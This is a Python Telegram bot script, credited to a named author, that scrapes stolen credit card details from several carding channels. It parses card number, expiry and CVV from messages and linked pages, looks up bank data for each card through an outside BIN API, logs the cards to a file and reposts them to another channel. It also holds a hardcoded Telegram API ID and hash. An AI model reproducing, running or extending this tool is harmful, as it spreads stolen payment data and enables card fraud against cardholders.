#Scrapper By: @Shein0425
#=≠=≠=≠=≠[Importacion Librerias]=≠=≠=≠#
import colorama
import names
import random
import telethon
import asyncio
import os, sys
import re
import requests
from telethon import TelegramClient, events
from random_address import real_random_address
from datetime import datetime
from tenplate import getUrl, getcards, phone
from colorama import Fore
from colorama import Style
#=≠=≠=≠[Fin Importacion Librerias]=≠=≠=≠#

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
clear()

colorama.init()
print(Fore.GREEN+"""                                                                     
 ____   ____ ____     _    ____  ____  _____ ____     ____ ____ ____  
/ ___| / ___|  _ \   / \  |  _ \|  _ \| ____|  _ \   / ___/ ___/ ___| 
\___ \| |   | |_) | / _ \ | |_) | |_) |  _| | |_) | | |  | |   \___ \ 
 ___) | |___|  _ < / ___ \|  __/|  __/| |___|  _ <  | |__| |___ ___) |
|____/ \____|_| \_/_/   \_|_|   |_|   |_____|_| \_\  \____\____|____/ 
                                                                      
"""+ Style.RESET_ALL)
print("""[ Version : 1.0 ] 
[ Creador : S H E I N]
[ Estado Scrapper : Ejecutando Correctamente ✅]
""")

#lo siguiente lo consigues en my.telegram.org

API_ID =  19403124 
API_HASH = '67af5c4b71e2d07966558670fe0b7917'
SEND_CHAT = '@scraperandrea' #chat donde se envian las ccs
client = TelegramClient('session', API_ID, API_HASH)
ccs = []

#chats donde toma las ccs
chats  = [
     '@ScrappCcs',
     '@ApiSitesScrapper',
     '@NfPrBroScraper',
     '@ScrapperLost',
     '@MacacosCC',
     '@JLScrapper',
]

with open('ccscrap.txt', 'r') as r:
    temp_cards = r.read().splitlines()


for x in temp_cards:
    car = getcards(x)
    if car:
        ccs.append(car[0])
    else:
        continue

@client.on(events.NewMessage(chats=chats, func = lambda x: getattr(x, 'text')))
async def my_event_handler(m):
    if m.reply_markup:
        text = m.reply_markup.stringify()
        urls = getUrl(text)
        if not urls:
            return
        text = requests.get(urls[0]).text
    else:
        text = m.text
    cards = getcards(text)
    if not cards:
        return
    cc,mes,ano,cvv = cards
    if cc in ccs:
        return
    ccs.append(cc)
    bin = requests.get(f'https://binchk-api.vercel.app/bin={cc[:6]}')
    if not bin:
        return
    bin_json =  bin.json()
    cccomple = f"{cc}|{mes}|{ano}|{cvv}"
    extra = cccomple[0:0 + 12]
    bini = cccomple[0:0 + 6]
    
    text = f"""
- - - - - - - - - - - - - - - - - - - - -
↯ CC ↯ ```{cccomple}```
- - - - - - - - - - - - - - - - - - - - -
↯ Bin ↯ ```{bini}``` **-  {bin_json['brand']} - {bin_json['type']} - {bin_json['level']} **
↯ Bank ↯ **{bin_json['bank']} **
↯ Country ↯ **{bin_json['country']} - {bin_json['flag']} **
- - - - - - - - - - - - - - - - - - - - -
↯ Extra ↯ ```{extra}xxxx{mes}|{ano}|```
- - - - - - - - - - - - - - - - - - - - -‌
𝙎𝙘𝙧𝙖𝙥𝙥𝙚𝙧 𝘽𝙮: @ANDREAYT02
𝙋𝙖𝙧𝙖 𝙋𝙧𝙚𝙢𝙞𝙪𝙢: @ANDREAYT02
""" 
    print(f'- - - - - - - - - - - - - - - ')
    print(f'{cccomple}')
    with open('ccscrap.txt', 'a') as w:
        w.write(cccomple + '\n')
    await client.send_message(SEND_CHAT, text, link_preview = False)


@client.on(events.NewMessage(outgoing = True, pattern = re.compile(r'.lives')))
async def my_event_handler(m):
    await m.reply(file = 'ccscrap.txt')

client.start()
client.run_until_disconnected()